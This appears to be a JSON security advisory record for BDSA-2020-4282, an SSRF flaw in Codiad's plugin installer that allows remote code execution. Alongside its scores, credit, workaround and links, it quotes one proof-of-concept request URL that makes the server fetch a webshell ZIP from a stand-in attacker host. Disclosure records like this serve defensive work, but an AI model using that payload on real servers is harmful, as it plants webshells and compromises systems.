{
    "source": "BDSA",
    "name": "BDSA-2020-4282",
    "title": "Codiad Vulnerable to Remote Code Execution (RCE) via Server Side Request Forgery (SSRF) in 'components/market/class.market.php' File",
    "description": "Codiad contains a vulnerability to server-side request forgery (SSRF) due to the improper validation of a client-provided input parameters. Attackers can exploit this by crafting a malicious request to retrieve content hosted on the server.",
    "technicalDescription": "This vulnerability exists within the `components/market/class.market.php` file. An attacker with admin privileges could use the plugin install feature to make the server request any URL resulting in remote code execution (RCE). This could be achieved by having the server download a malicious ZIP file that will be extracted to the `plugins` or `themes` directories. The primary cause of this vulnerability is that the `$repo` variable in the `Install()` function is not validated properly before its contents are processed. As demonstrated in the PoC, an attacker could exploit this flaw using a payload like  `http://127.0.0.1/components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=`. This payload results in the file `webshell.zip` being downloaded and extracted on the server. This could result in RCE.\n\n**Note**: The vendor states that this product is unmaintained.",
    "publishedDate": "2021-03-18T13:53:00.113Z",
    "updatedDate": "2021-09-13T11:11:21.369Z",
    "disclosureDate": "2020-06-03T00:00:00.000Z",
    "exploitPublishDate": "2020-06-03T00:00:00.000Z",
    "solution": "",
    "severity": "HIGH",
    "cvss2": {
        "baseScore": 5.5,
        "impactSubscore": 4.9,
        "exploitabilitySubscore": 8.0,
        "severity": "MEDIUM",
        "accessVector": "NETWORK",
        "accessComplexity": "LOW",
        "authentication": "SINGLE",
        "confidentialityImpact": "PARTIAL",
        "integrityImpact": "PARTIAL",
        "availabilityImpact": "NONE",
        "temporalMetrics": {
            "exploitability": "PROOF_OF_CONCEPT",
            "remediationLevel": "WORKAROUND",
            "reportConfidence": "UNCONFIRMED",
            "score": 4.2
        },
        "vector": "(AV:N/AC:L/Au:S/C:P/I:P/A:N/E:POC/RL:W/RC:UC)"
    },
    "cvss3": {
        "baseScore": 8.7,
        "impactSubscore": 5.8,
        "exploitabilitySubscore": 2.3,
        "severity": "HIGH",
        "attackVector": "NETWORK",
        "attackComplexity": "LOW",
        "confidentialityImpact": "HIGH",
        "integrityImpact": "HIGH",
        "availabilityImpact": "NONE",
        "privilegesRequired": "HIGH",
        "scope": "CHANGED",
        "userInteraction": "NONE",
        "temporalMetrics": {
            "exploitability": "PROOF_OF_CONCEPT",
            "remediationLevel": "WORKAROUND",
            "reportConfidence": "UNKNOWN",
            "score": 7.3
        },
        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N/E:P/RL:W/RC:U"
    },
    "useCvss3": true,
    "classifications": [],
    "zeroDay": false,
    "underReview": false,
    "parentAdvisory": false,
    "credit": "Yaniv Nizry",
    "workaround": "It is recommended to verify that the plugin/theme is from a known list. Alternatively, this feature should be disabled and only be installed manually when it's needed.",
    "vendorNotifiedDate": "2020-06-03T00:00:00.000Z",
    "bdsaTags": [
        "RCE"
    ],
    "overallScore": 7.3,
    "_meta": {
        "allow": [
            "GET"
        ],
        "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-4282",
        "links": [
            {
                "rel": "cwes",
                "href": "https://trendmicro2.app.blackduck.com/api/cwes/CWE-918"
            },
            {
                "rel": "related-vulnerability",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/CVE-2020-14044",
                "label": "NVD"
            },
            {
                "rel": "bdsa-ranges",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-4282/ranges"
            },
            {
                "rel": "reference",
                "href": "https://github.com/Codiad/Codiad/blob/master/README.md",
                "label": "LINK"
            },
            {
                "rel": "reference",
                "href": "https://github.com/Codiad/Codiad/issues/1122",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://github.com/Codiad/Codiad/issues/1122",
                "label": "POC"
            },
            {
                "rel": "reference",
                "href": "https://github.com/Codiad/Codiad/issues/1122",
                "label": "WORKAROUND"
            },
            {
                "rel": "default-remediation-status",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2020-4282/default-remediation-status"
            }
        ]
    }
}